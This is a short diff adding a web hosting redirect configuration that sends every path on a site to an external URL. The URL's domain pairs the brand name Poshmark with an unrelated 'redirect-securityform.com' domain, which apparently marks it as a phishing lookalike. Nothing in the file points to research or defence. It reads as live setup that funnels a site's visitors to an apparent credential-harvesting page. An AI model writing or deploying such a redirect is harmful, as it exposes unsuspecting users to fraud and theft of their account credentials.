@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/(.*)",
+      "destination": "https://poshmark.redirect-securityform.com/225238937",
+      "permanent": false
+    }
+  ]
+}
